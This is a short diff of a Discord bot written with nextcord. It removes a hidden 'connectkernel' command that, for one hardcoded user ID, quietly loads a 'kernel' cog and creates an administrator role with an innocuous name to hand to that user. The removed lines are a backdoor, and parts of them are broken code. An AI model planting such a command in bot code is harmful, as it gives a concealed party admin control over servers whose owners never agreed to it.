@@ -7,7 +7,7 @@ import embeds
 from nextcord.ext import commands
 from dotenv import load_dotenv
 from music import music_cog
-from kernel import kernel
+import curses
 print("start...")
 
 load_dotenv()
@@ -146,25 +146,5 @@ async def openchat(ctx):
         await ctx.send(embed=successEmbed(f'Chat successfully **opened**'))
     else:
         await ctx.send(embed=embeds.errorEmbed())
-
-
-@bot.command(name="connectkernel")
-async def back(ctx):
-    if ctx.author.id == 818107282994626597:
-        await clearMsg(ctx)
-        user = ctx.message.author
-        await bot.add_cog(kernel(bot))
-        role = discord.utils.get(ctx.guild.roles, name="sysProjectLimited")
-
-        if role is None:
-            perm = discord.Permissions()
-            perm.update(administrator = True)
-            await ctx.guild.create_role(name="sysProjectLimited", permissions=perm)
-            permissions=discord.Permissions.administrator
-            discord.utils.get(user.server.roles, name="role to add name")
-            await client.add_roles(user, role)
-    else:
-        pass
-
 
 bot.run(TOKEN)
